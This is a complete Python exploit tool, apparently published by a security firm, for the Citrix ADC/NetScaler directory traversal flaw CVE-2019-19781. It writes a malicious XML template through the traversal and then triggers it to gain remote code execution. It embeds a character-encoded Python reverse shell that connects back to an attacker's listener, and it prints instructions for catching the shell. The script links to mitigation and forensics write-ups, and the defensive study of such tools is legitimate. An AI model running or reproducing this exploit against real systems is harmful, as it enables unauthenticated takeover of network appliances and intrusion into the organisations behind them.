#!/usr/bin/env python3
#
# Exploits the Citrix Directory Traversal Bug: CVE-2019-19781 
# Writeup and mitigation: https://www.trustedsec.com/blog/critical-exposure-in-citrix-adc-netscaler-unauthenticated-remote-code-execution/
# Forensics and IoC Blog: https://www.trustedsec.com/blog/netscaler-remote-code-execution-forensics/
#
# You only need a listener like netcat to catch the shell.
#
# Shout out to the team: Rob Simon, Justin Elze, Logan Sampson, Geoff Walton, Christopher Paschen, Kevin Haubris, Scott White
#
# Company: TrustedSec, LLC
# Tool Written by: Rob Simon and David Kennedy
#
#
# Usage: python3 citrixmash.py <victimaddress> <victimport> <attacker_listener> <attacker_port>
# Also: python3 citrixmash.py -h
#
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # disable warnings
import random
import string
import time
from random import randint
import argparse
import sys

# random string generator
def randomString(stringLength=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

# our random string for filename - will leave artifacts on system
filename = randomString()
randomuser = randomString()

# generate random number for the nonce
nonce = randint(5, 15)

# this is our first stage which will write out the file through the Citrix traversal issue and the newbm.pl script
# note that the file location will be in /netscaler/portal/templates/filename.xml
def stage1(filename, randomuser, nonce, victimip, victimport, attackerip, attackerport):

    # encoding our payload stub for one netcat listener - awesome work here Rob Simon (KC)
    encoded = ""
    i=0
    text = ("""/var/python/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (attackerip, attackerport))
    while i < len(text):
        encoded = encoded + "chr("+str(ord(text[i]))+") . "
        i += 1
    encoded = encoded[:-3]
    payload="[% template.new({'BLOCK'='print readpipe(" + encoded + ")'})%]"
    # this is our stage where we prep our payload to disk and do a POST request to vpn/../vpns/portal/scripts/newbm.pl this is a directory traversal attack
    # from here, we use newbm.pl to send data elements which contain the format we need to create an xml file that is written to disk
    # the filename is randomized because if you fire the same name twice it just appends the xml and it'll break things
    # here we use the data field to create and insert our code into the title field which is stored on disk
    # our payload on disk will look something like this:
    # <?xml version="1.0" encoding="UTF-8"?>
    # <user username="../../../netscaler/portal/templates/znpekddugm">
    # <bookmarks>
    # <bookmark UI_inuse="a" descr="desc" title="[% template.new({'BLOCK'='print readpipe(ourpayload'})%]" url="http://127.0.0.1" />
    # </bookmarks>
    # <escbk>
    # </escbk>
    # <filesystems></filesystems>
    # <style></style>
    # </user>
    headers = (
        {
            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0',
            'NSC_USER' : '../../../netscaler/portal/templates/%s' % (filename),
            'NSC_NONCE' : '%s' % (nonce),
        })

    data = (
        {
            "url" : "127.0.0.1",
            "title" : payload,
            "desc" : "desc",
            "UI_inuse" : "a"
        })

    # add support for port 80
    if victimport == ("80"):
        url = ("http://%s:%s/vpn/../vpns/portal/scripts/newbm.pl" % (victimip, victimport))
    else:
        url = ("https://%s:%s/vpn/../vpns/portal/scripts/newbm.pl" % (victimip, victimport))

    try:

        req = requests.post(url, data=data, headers=headers, verify=False)
        # only seen when we have a successful system
        if (".ns_reload()") in str(req.content):
            print("[*] We got an expected response back for a vulnerable system. Initial stage exploit likely successful.")

        # 403 usually indicates it has been patched, Citrix means script wasn't found and also patched
        if ("Citrix") in str(req.content) or "403" in str(req.status_code):
            print("[\033[91m!\033[0m] The exploit failed due to the system being patched. Exiting Citrixmash.")
            sys.exit()

    # handle exception errors due to timeouts
    except requests.ReadTimeout: 
        print("[-] ReadTimeout: Server %s timed out and didn't respond on port: %s." % (victimip, victimport))

    except requests.ConnectTimeout:
        print("[-] ConnectTimeout: Server %s did not respond to a web request or the port (%s) is not open." % (victimip, victimport))

    except requests.ConnectionError:
        print("[-] ConnectionError: Server %s did not respond to a web request or the port (%s) is not open." % (victimip,victimport))

# this is our second stage that triggers the exploit for us
def stage2(filename, randomuser, nonce, victimip, victimport):
    # this is where we call the file we just created, the XML on disk. Once called using the traversal attack again, it'll execute our pay load
    # in our case we decided to use Python.. based on being nested in perl, the escaping was weird which is why the payload needed to be converted
    headers = (
        {
            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0',
            'NSC_USER' : '%s' % (randomuser),
            'NSC_NONCE' : '%s' % (nonce),
        })

    # add support for port 80
    if victimport == ("80"):
        url = ("http://%s:%s/vpn/../vpns/portal/%s.xml" % (victimip, victimport, filename))

    # using https
    else:
        url = ("https://%s:%s/vpn/../vpns/portal/%s.xml" % (victimip, victimport, filename))

    requests.get(url, headers=headers, verify=False)

# start our main code to execute
print('''

  .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :

Citrixmash v0.1 - Exploits the Citrix Directory Traversal Bug: CVE-2019-19781
Company: TrustedSec, LLC
Tool Written by: Rob Simon and Dave Kennedy
Contributions: The TrustedSec Team 
Website: https://www.trustedsec.com
INFO: https://www.trustedsec.com/blog/critical-exposure-in-citrix-adc-netscaler-unauthenticated-remote-code-execution/

This tool exploits a directory traversal bug within Citrix ADC (NetScalers) which calls a perl script that is used
to append files in an XML format to the victim machine. This in turn allows for remote code execution.

Be sure to cleanup these two file locations:
    /var/tmp/netscaler/portal/templates/
    /netscaler/portal/templates/

IP Addresses and DNS names are usable in the victim address and attacker_listener fields (if host supports DNS).

Usage:

python3 citrixmash.py <victimaddress> <victimport> <attackerip_listener> <attacker_port>\n''')

# parse our commands
parser = argparse.ArgumentParser()
parser.add_argument("target", help="the vulnerable server with Citrix hostname or IP (defaults https)")
parser.add_argument("targetport", help="the target server web port (normally on 443)")
parser.add_argument("attackerip", help="the attackers reverse listener IP or hostname address")
parser.add_argument("attackerport", help="the attackers reverse listener port")
args = parser.parse_args()
print("[*] Firing STAGE1 POST request to create the XML template exploit to disk...")
print("[*] Saving filename as %s.xml on the victim machine..." % (filename))

try:
    # trigger our first reuqest - POST to create our malicious XML through the traversal/perl file attack
    stage1(filename, randomuser, nonce, args.target, args.targetport, args.attackerip, args.attackerport)
    print("[*] Sleeping for 2 seconds to ensure file is written before we call it...")
    time.sleep(2)
    print("[*] Triggering GET request for the newly created file with a listener waiting...")
    print("[*] Shell should now be in your listener... enjoy. Keep this window open..")
    print("[!] Be sure to cleanup the two locations here (artifacts): /var/tmp/netscaler/portal/templates/, /netscaler/portal/templates/")
    # trigger our second request - get to execute payload
    stage2(filename, randomuser, nonce, args.target, args.targetport)

except KeyboardInterrupt:
    print("[*] Control-C detected, exiting gracefully... Exiting Citrixmash.")
    sys.exit()
